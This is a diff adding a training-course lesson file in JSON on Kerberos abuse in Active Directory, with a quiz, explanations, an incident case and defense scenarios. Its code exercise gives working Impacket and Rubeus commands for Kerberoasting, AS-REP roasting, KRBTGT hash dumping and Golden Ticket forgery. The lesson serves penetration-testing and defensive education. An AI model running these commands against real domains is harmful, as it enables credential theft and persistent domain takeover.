@@ -1,0 +1,110 @@
+{
+  "lesson_id": "c9d0e1f2-a3b4-4c5d-6e7f-8a9b0c1d2e3f",
+  "domain": "active_directory",
+  "title": "Kerberos Abuse and Golden Tickets",
+  "difficulty": 3,
+  "order_index": 39,
+  "prerequisites": [],
+  "concepts": ["Kerberos authentication protocol mechanics", "Kerberoasting attack technique", "AS-REP roasting attack technique", "Golden Ticket persistence", "Kerberos detection and hardening"],
+  "estimated_time": 60,
+  "learning_objectives": [
+    "Understand Kerberos authentication flow and identify exploitable weaknesses at each step",
+    "Perform Kerberoasting attacks to extract service account password hashes from TGS tickets",
+    "Execute AS-REP roasting attacks against accounts with Kerberos pre-authentication disabled",
+    "Create Golden Tickets for persistent domain access using the KRBTGT hash",
+    "Detect Kerberos abuse through event log monitoring and implement effective hardening measures"
+  ],
+  "post_assessment": [
+    {
+      "question": "In a Kerberoasting attack, what specific information does the attacker extract from the TGS ticket?",
+      "options": [
+        "The user's NTLM hash",
+        "The service account's NTLM hash, encrypted with the service account's password",
+        "The KRBTGT hash",
+        "The TGT ticket contents"
+      ],
+      "correct_answer": "The service account's NTLM hash, encrypted with the service account's password",
+      "explanation": "The TGS ticket is encrypted with the service account's NTLM hash (derived from its password). When an attacker requests a TGS for an SPN, they receive this encrypted ticket. They can then attempt to crack the service account's password offline by brute-forcing the NTLM hash — all without contacting the KDC or triggering failed login events."
+    },
+    {
+      "question": "Which condition must be true for an AS-REP roasting attack to succeed?",
+      "options": [
+        "The target account must be a domain admin",
+        "The target account must have 'Do not require Kerberos preauthentication' enabled",
+        "The attacker must already have domain admin privileges",
+        "The domain must not have AES encryption enabled"
+      ],
+      "correct_answer": "The target account must have 'Do not require Kerberos preauthentication' enabled",
+      "explanation": "AS-REP roasting targets accounts where Kerberos pre-authentication is disabled. Normally, the first step of Kerberos authentication (AS-REQ) requires the user to encrypt a timestamp with their password hash. When pre-auth is disabled, the KDC responds with the AS-REP without verifying the user first — and this response contains data encrypted with the user's password hash, which can be cracked offline."
+    },
+    {
+      "question": "What is the critical difference between Kerberoasting and AS-REP roasting in terms of the privileges required?",
+      "options": [
+        "Kerberoasting requires domain admin, AS-REP roasting requires local admin",
+        "Kerberoasting requires any authenticated domain user, AS-REP roasting also requires only any authenticated domain user",
+        "Kerberoasting requires no authentication, AS-REP roasting requires domain admin",
+        "Kerberoasting requires local admin on the target, AS-REP roasting requires network access only"
+      ],
+      "correct_answer": "Kerberoasting requires any authenticated domain user, AS-REP roasting also requires only any authenticated domain user",
+      "explanation": "Both attacks can be performed by any authenticated domain user. Kerberoasting requests TGS tickets for SPNs, which any domain user can do. AS-REP roasting sends AS-REQs for accounts with pre-auth disabled, which doesn't require any special privileges. This makes both attacks extremely accessible — an attacker with even a low-privileged domain account can attempt them."
+    },
+    {
+      "question": "After creating a Golden Ticket, an attacker can access domain resources even after the domain admin password is changed. What is the ONLY effective remediation?",
+      "options": [
+        "Changing all user passwords in the domain",
+        "Resetting the KRBTGT password twice",
+        "Disabling the Kerberos protocol and switching to NTLM",
+        "Rebooting all domain controllers"
+      ],
+      "correct_answer": "Resetting the KRBTGT password twice",
+      "explanation": "A Golden Ticket is signed with the KRBTGT hash. Changing the domain admin password has no effect because the ticket uses the KRBTGT key, not the admin's password. The KRBTGT password must be reset TWICE because the KDC caches the current and previous KRBTGT key. A single reset means the old key is still cached and valid. The second reset invalidates both the current and previous keys."
+    }
+  ],
+  "jim_kwik_principles": ["Visualization", "Association", "Emotion", "Storytelling", "Chunking", "Active Recall", "Spaced Repetition", "Mnemonics", "Teach Back", "Curiosity"],
+  "content_blocks": [
+    {
+      "type": "mindset_coach",
+      "title": "Kerberos: The Authentication Protocol That Powers Active Directory",
+      "content": "Kerberos is the backbone of Active Directory authentication — and understanding it deeply is non-negotiable for both red and blue teamers. The attacks you'll learn in this lesson (Kerberoasting, AS-REP roasting, Golden Tickets) are among the most common and impactful techniques used in real breaches. They work because Kerberos was designed for a trusted network environment, and AD deployments often have misconfigurations that attackers exploit. Master this lesson, and you'll understand the 'why' behind some of the most critical AD security controls."
+    },
+    {
+      "type": "explanation",
+      "title": "Kerberos Authentication Flow: Understanding the Target",
+      "content": "Kerberos authentication in Active Directory follows a specific flow with three key exchanges:\n\n**Step 1: AS-REQ / AS-REP (Authentication Service)**\nThe client sends an AS-REQ to the KDC, which includes the user's username and a timestamp encrypted with the user's password hash (pre-authentication). The KDC validates the user and responds with an AS-REP containing the TGT (Ticket Granting Ticket), encrypted with the KRBTGT account's hash.\n\n**Step 2: TGS-REQ / TGS-REP (Ticket Granting Service)**\nThe client presents the TGT to the KDC and requests access to a specific service (identified by its SPN). The KDC responds with a TGS ticket, encrypted with the service account's password hash. This ticket proves the user is authenticated and authorized to access the service.\n\n**Step 3: AP-REQ / AP-REP (Application Protocol)**\nThe client presents the TGS ticket to the target service. The service decrypts it using its own password hash, validates the user's identity and group memberships, and grants access.\n\n**Attack surfaces at each step:**\n- AS-REQ/AS-REP: AS-REP roasting (if pre-auth is disabled)\n- TGS-REQ/TGS-REP: Kerberoasting (offline cracking of service account hashes)\n- TGT creation: Golden Ticket attacks (if KRBTGT hash is compromised)\n- AP-REQ: Pass-the-Ticket, S4U2Proxy abuse\n\n**Key Kerberos objects:**\n- TGT: Valid for 10 hours by default, encrypted with KRBTGT hash\n- TGS: Valid for the service, encrypted with service account hash\n- PAC: Privilege Attribute Certificate, contains user's group memberships\n- KRBTGT: Special account whose hash is used to encrypt all TGTs"
+    },
+    {
+      "type": "explanation",
+      "title": "Teach Me Like I'm 10: Kerberos Like a Movie Theater",
+      "content": "Imagine a movie theater with three steps:\n\n**Step 1 — Getting Your VIP Pass (AS-REQ/AS-REP)**\nYou walk up to the ticket booth (KDC) and say 'I'm Alex, and here's proof it's really me' (pre-auth). The booth checks your ID and gives you a VIP pass (TGT) that's sealed in a special envelope only the booth can open. This pass says 'Alex is authenticated' and is valid for the whole day.\n\n**Step 2 — Getting a Movie Ticket (TGS-REQ/TGS-REP)**\nNow you want to see 'Avengers.' You show your VIP pass to the ticket booth, and they give you a specific movie ticket (TGS) for 'Avengers.' This ticket is sealed in an envelope that only the Avengers theater can open.\n\n**Step 3 — Entering the Theater (AP-REQ)**\nYou walk to the Avengers theater and hand them your movie ticket. The theater opens the envelope (using their own key) and lets you in.\n\n**Now the attacks:**\n\n**Kerberoasting:** Some movie theaters have weak locks on their envelopes (weak service account passwords). When you ask for a ticket to that theater, you get an envelope you can take home and try to pick the lock offline. Since you can ask for ANY theater's ticket just by showing your VIP pass, you can collect envelopes for all the theaters and crack the weak ones at home.\n\n**AS-REP Roasting:** Some people have a special note on their account saying 'don't check their ID' (no pre-auth). Anyone can walk up to the booth, say 'I'm Alex' without proving it, and get a VIP pass envelope they can try to crack. The booth doesn't check because the account says pre-auth isn't needed.\n\n**Golden Ticket:** If you steal the booth's master stamp (KRBTGT hash), you can make your OWN VIP passes for ANY person — even people who don't exist! The theaters can't tell the difference because the stamp is real."
+    },
+    {
+      "type": "code_exercise",
+      "title": "Kerberos Attack Lab with Rubeus and Impacket",
+      "content": "Practice Kerberos attacks using both Windows (Rubeus) and Linux (Impacket) tools:\n\n# ===== KERBEROASTING =====\n\n# Linux: Using Impacket's GetUserSPNs\n# Enumerate SPNs (service accounts with SPNs are Kerberoastable)\nimpacket-GetUserSPNs domain.local/user:password -dc-ip 192.168.1.10\n\n# Request TGS tickets and extract hashes for offline cracking\nimpacket-GetUserSPNs domain.local/user:password -dc-ip 192.168.1.10 -request\n\n# Target a specific SPN\nimpacket-GetUserSPNs domain.local/user:password -dc-ip 192.168.1.10 -request-user svc_mssql\n\n# Crack the hash with hashcat\nhashcat -m 13100 kerberoast_hashes.txt /opt/wordlists/rockyou.txt\n# Mode 13100 = Kerberos 5 TGS-REP etype 23\n\n# Windows: Using Rubeus\n# Enumerate Kerberoastable accounts\nRubeus.exe kerberoast /stats\n\n# Request all Kerberoastable TGS tickets\nRubeus.exe kerberoast /nowrap\n\n# Target a specific user\nRubeus.exe kerberoast /user:svc_mssql /nowrap\n\n# ===== AS-REP ROASTING =====\n\n# Linux: Using Impacket\nimpacket-GetNPUsers domain.local/user:password -dc-ip 192.168.1.10\n\n# Target a specific user\nimpacket-GetNPUsers domain.local/ -usersfile users.txt -dc-ip 192.168.1.10\n\n# Crack the AS-REP hash\nhashcat -m 18200 asrep_hashes.txt /opt/wordlists/rockyou.txt\n# Mode 18200 = Kerberos 5 AS-REP etype 23\n\n# Windows: Using Rubeus\nRubeus.exe asreproast /nowrap\n\n# ===== GOLDEN TICKET =====\n\n# Linux: Using Impacket's ticketer\n# First, obtain the KRBTGT hash (requires DA)\nimpacket-secretsdump domain.local/admin:password@192.168.1.10\n\n# Create a Golden Ticket\nimpacket-ticketer -nthash <KRBTGT_HASH> -domain-sid S-1-5-21-XXX -domain domain.local -spn cifs/dc01.domain.local administrator\n\n# Use the ticket with Impacket tools\nexport KRB5CCNAME=administrator.ccache\nimpacket-psexec domain.local/administrator@dc01.domain.local -k -no-pass\n\n# Windows: Using Rubeus\n# Create Golden Ticket\nRubeus.exe golden /user:Administrator /domain:domain.local /sid:S-1-5-21-XXX /krbtgt:<KRBTGT_HASH> /ptt\n\n# Verify\nklist\nnet use \\\\dc01\\c$",
+      "code": "# Kerberoasting with Impacket\nimpacket-GetUserSPNs domain.local/user:password -dc-ip 192.168.1.10 -request\nhashcat -m 13100 hashes.txt rockyou.txt\n\n# AS-REP Roasting\nimpacket-GetNPUsers domain.local/user:password -dc-ip 192.168.1.10\nhashcat -m 18200 asrep_hashes.txt rockyou.txt\n\n# Golden Ticket\nimpacket-ticketer -nthash <HASH> -domain-sid S-1-5-21-XXX -domain domain.local administrator\nexport KRB5CCNAME=administrator.ccache\nimpacket-psexec domain.local/administrator@dc01 -k -no-pass",
+      "language": "bash"
+    },
+    {
+      "type": "real_world",
+      "title": "Real-World: Kerberoasting in the Wild",
+      "content": "In a 2023 incident response engagement, the DFIR team discovered the following Kerberos-based attack chain:\n\n**Initial Access:** Phishing email delivered an HTML application (.hta) that executed a PowerShell download cradle, giving the attacker a foothold as a standard domain user.\n\n**Reconnaissance:** The attacker ran BloodHound to map the domain and identified 23 service accounts with SPNs (Kerberoastable).\n\n**Kerberoasting:**\nimpacket-GetUserSPNs corp.local/jsmith:Spring2023! -dc-ip 10.0.0.1 -request\n\nThe attacker collected TGS hashes for all 23 service accounts. Within 4 hours, 5 accounts had cracked passwords:\n- svc_sql (Password123!) — SQL Server service account, member of local Administrators on SQL01\n- svc_backup (Summer2023) — Backup service account, member of Backup Operators\n- svc_iis (Welcome1) — IIS service account, local admin on WEB01\n- svc_scan (Scan2023!) — Scanning service, member of Print Operators\n- svc_mssql (Corp12345) — MSSQL service account with db_owner role\n\n**Lateral Movement:** Using the svc_sql credentials, the attacker accessed SQL01, found the SA password in a connection string, and used it to gain local admin access. From SQL01, they dumped the local SAM database and found a cached domain admin credential.\n\n**Domain Admin:** Using the domain admin credential, the attacker extracted the KRBTGT hash and created a Golden Ticket for persistent access.\n\n**Detection Events the Team Missed:**\n- Event ID 4769 with encryption type 0x17 (RC4) — Indicates Kerberoasting (attacker requested RC4-encrypted TGS)\n- Event ID 4768 without prior 4768 for the same account — AS-REP roasting indicator\n- Multiple TGS requests in rapid succession — Abnormal Kerberos activity\n- RC4 encryption in Kerberos traffic — Modern domains should use AES256\n\n**Remediation:**\n- Changed all 5 compromised service account passwords (25+ character random passwords)\n- Enabled AES256 encryption on all service accounts\n- Set 'This account supports Kerberos AES 256 bit encryption' on all SPN accounts\n- Reset KRBTGT password twice (with 12-hour interval to allow replication)\n- Deployed monitoring for Event ID 4769 with RC4 encryption type"
+    },
+    {
+      "type": "memory_aid",
+      "title": "Kerberos Attack Quick Reference: KAST Mnemonic",
+      "content": "**K** — Kerberoasting\n  Target: Service accounts with SPNs\n  Requires: Any authenticated domain user\n  Attack: Request TGS → Extract encrypted hash → Crack offline\n  Detection: Event 4769 with RC4 encryption (0x17)\n  Fix: 25+ char passwords, enable AES256, gMSA accounts\n\n**A** — AS-REP Roasting\n  Target: Accounts with 'Do not require Kerberos preauthentication'\n  Requires: Any authenticated domain user (or even unauthenticated in some cases)\n  Attack: Send AS-REQ → Get AS-REP without pre-auth → Crack offline\n  Detection: Event 4768 without pre-auth data\n  Fix: Enable pre-authentication on all accounts\n\n**S** — Silver Ticket\n  Target: Specific service (using service account hash)\n  Requires: Service account NTLM hash\n  Attack: Forge TGS for specific service without contacting KDC\n  Detection: Service access without preceding 4768 (TGT request)\n  Fix: Service account password rotation, PAC validation\n\n**T** — Ticket manipulation (Golden, Diamond, Sapphire)\n  Target: Full domain access (Golden), or forged PACs (Diamond/Sapphire)\n  Requires: KRBTGT hash (Golden), or manipulated signatures\n  Attack: Forge TGT with arbitrary user/group membership\n  Detection: Event 4624 for non-existent users, abnormal ticket lifetimes\n  Fix: Reset KRBTGT password twice, monitor for forged tickets",
+      "language": "yaml"
+    },
+    {
+      "type": "reflection",
+      "title": "Kerberos Defense Scenarios",
+      "content": "Consider these defense scenarios:\n\n1. You're a domain administrator reviewing service accounts. You find 15 accounts with SPNs, 8 of which have passwords under 12 characters. What attack are these vulnerable to, and what's the remediation priority?\n\n2. Your SOC alerts you to Event ID 4769 entries showing a single user requesting TGS tickets for 50 different SPNs in 10 minutes. What attack is likely occurring, and what should you investigate?\n\n3. You discover that the KRBTGT password was last changed 3 years ago, and you suspect a Golden Ticket attack may have occurred. What steps do you take, and in what order?\n\n4. A security audit reveals 3 user accounts with 'Do not require Kerberos preauthentication' enabled. What's the risk, and what's the immediate remediation?\n\nAnswers: (1) These are vulnerable to Kerberoasting. Prioritize changing passwords for the weakest accounts first, then enable AES256 encryption. Long term, migrate to gMSA accounts. (2) This is likely Kerberoasting — an attacker is harvesting TGS tickets for offline cracking. Investigate the source account, check if its tickets used RC4 encryption, and monitor for subsequent lateral movement. (3) First, isolate suspected compromised systems. Second, reset KRBTGT password once, wait for replication (12+ hours). Third, reset KRBTGT password again. Fourth, force password resets for all privileged accounts. Fifth, audit all domain admin logins during the suspected compromise window. (4) These accounts are vulnerable to AS-REP roasting — any attacker can request their AS-REP without authentication and crack the hash offline. Immediate remediation: enable pre-authentication on all three accounts."
+    },
+    {
+      "type": "mindset_coach",
+      "title": "Kerberos Attacks Are Foundational",
+      "content": "Kerberos abuse is one of the most impactful attack categories in Active Directory. Kerberoasting alone accounts for a significant percentage of real-world domain compromises because it requires only a standard user account and can be executed in seconds. The key defensive principle: every Kerberos weakness traces back to either a misconfiguration (disabled pre-auth, RC4 encryption) or a weak credential (service account passwords, KRBTGT not regularly rotated). Harden the configurations, strengthen the credentials, and monitor the events — and you've eliminated the vast majority of Kerberos-based attack paths."
+    }
+  ],
+  "tags": ["Course: OffSec-PEN300", "Career Path: Red Teamer", "Career Path: Pentester"]
+}
